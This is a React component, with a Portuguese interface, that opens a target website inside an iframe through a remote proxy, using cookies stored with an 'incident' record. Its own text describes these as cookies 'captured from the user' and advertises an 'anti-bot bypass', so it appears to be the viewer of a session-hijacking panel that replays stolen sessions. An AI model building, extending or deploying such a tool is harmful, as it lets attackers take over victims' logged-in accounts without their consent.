import { useState, useEffect } from "react";
import { Globe, RefreshCw, ExternalLink, AlertCircle } from "lucide-react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";

interface LiveSiteViewerProps {
  incident: {
    id: string;
    host: string;
    tab_url?: string;
    cookie_data?: any;
    full_cookie_data?: any;
  };
  onClose: () => void;
}

export const LiveSiteViewer = ({ incident, onClose }: LiveSiteViewerProps) => {
  const [proxyUrl, setProxyUrl] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [cookies, setCookies] = useState<any[]>([]);

  useEffect(() => {
    // Try to get cookies from full_cookie_data first, then fallback to cookie_data
    const cookieSource = incident.full_cookie_data || incident.cookie_data;
    
    if (cookieSource) {
      try {
        let parsedData;
        
        if (typeof cookieSource === 'string') {
          parsedData = JSON.parse(cookieSource);
        } else {
          parsedData = cookieSource;
        }

        // Convert different cookie data formats to standard format
        let cookieArray = [];
        
        if (Array.isArray(parsedData)) {
          // Already in array format
          cookieArray = parsedData;
        } else if (typeof parsedData === 'object') {
          // Convert object format {name: value} to array format
          cookieArray = Object.entries(parsedData).map(([name, value]) => ({
            name,
            value: String(value),
            domain: incident.host,
            path: '/'
          }));
        }
        
        setCookies(cookieArray);
      } catch (error) {
        console.error('Error parsing cookie data:', error);
        setCookies([]);
      }
    }
  }, [incident.full_cookie_data, incident.cookie_data, incident.host]);

  const loadSiteWithCookies = () => {
    if (!incident.tab_url) {
      setError('URL do site não disponível');
      return;
    }

    setError(null);

    try {
      console.log('Loading site with cookies:', incident.tab_url, cookies);

      // Build direct proxy URL with cache busting timestamp
      const proxyBase = 'https://vxvcquifgwtbjghrcjbp.supabase.co/functions/v1/site-proxy';
      const encodedUrl = encodeURIComponent(incident.tab_url);
      const cacheBuster = Date.now();
      const url = `${proxyBase}?url=${encodedUrl}&incident=${incident.id}&_t=${cacheBuster}`;
      
      console.log('🌐 Loading URL with cache buster:', url);
      setProxyUrl(url);
      toast.success('Site carregado com proxy universal ativo');

    } catch (err: any) {
      console.error('Error loading site:', err);
      setError(err.message || 'Erro ao carregar site');
      toast.error('Falha ao carregar site com cookies');
    }
  };

  const refreshSite = () => {
    setProxyUrl(null);
    setTimeout(() => loadSiteWithCookies(), 100);
  };

  const openInNewTab = () => {
    if (incident.tab_url) {
      window.open(incident.tab_url, '_blank');
    }
  };

  return (
    <Card className="w-full h-full flex flex-col">
      <CardHeader className="pb-4">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <Globe className="h-5 w-5 text-primary" />
            <CardTitle className="text-lg">Visualizar Site com Cookies</CardTitle>
          </div>
          <Button variant="outline" size="sm" onClick={onClose}>
            Fechar
          </Button>
        </div>
        
        <div className="flex items-center gap-2 text-sm text-muted-foreground flex-wrap">
          <span className="font-medium">Host:</span>
          <span>{incident.host}</span>
          {cookies.length > 0 && (
            <Badge variant="secondary" className="ml-2">
              {cookies.length} cookies • Anti-bot bypass
            </Badge>
          )}
          {proxyUrl && (
            <Badge variant="outline" className="ml-2 text-primary border-primary">
              Proxy Universal • Imagens + CSS + JS
            </Badge>
          )}
        </div>

        <div className="flex items-center gap-2 mt-2">
          <Button
            onClick={loadSiteWithCookies}
            disabled={!incident.tab_url}
            size="sm"
            className="gap-2"
          >
            <Globe className="h-4 w-4" />
            Carregar com Cookies
          </Button>
          
          {proxyUrl && (
            <Button
              onClick={refreshSite}
              variant="outline"
              size="sm"
              className="gap-2"
            >
              <RefreshCw className="h-4 w-4" />
              Atualizar
            </Button>
          )}
          
          <Button
            onClick={openInNewTab}
            variant="outline"
            size="sm"
            className="gap-2"
          >
            <ExternalLink className="h-4 w-4" />
            Abrir Original
          </Button>
        </div>
      </CardHeader>

      <CardContent className="flex-1 p-0">
        {error && (
          <Alert variant="destructive" className="m-4">
            <AlertCircle className="h-4 w-4" />
            <AlertDescription>{error}</AlertDescription>
          </Alert>
        )}

        {proxyUrl && (
          <iframe
            key={proxyUrl}
            src={proxyUrl}
            className="w-full h-full border-0"
            sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation-by-user-activation"
            title={`Site: ${incident.host}`}
            onLoad={() => console.log('✅ Iframe loaded successfully')}
            onError={(e) => console.error('❌ Iframe load error:', e)}
          />
        )}

        {!proxyUrl && !error && (
          <div className="flex items-center justify-center h-64 text-center">
            <div>
              <Globe className="h-12 w-12 mx-auto mb-4 text-muted-foreground" />
              <p className="text-muted-foreground mb-2">
                Clique em "Carregar com Cookies" para visualizar o site
              </p>
              <p className="text-sm text-muted-foreground">
                O site será carregado com os cookies capturados do usuário
              </p>
            </div>
          </div>
        )}
      </CardContent>
    </Card>
  );
};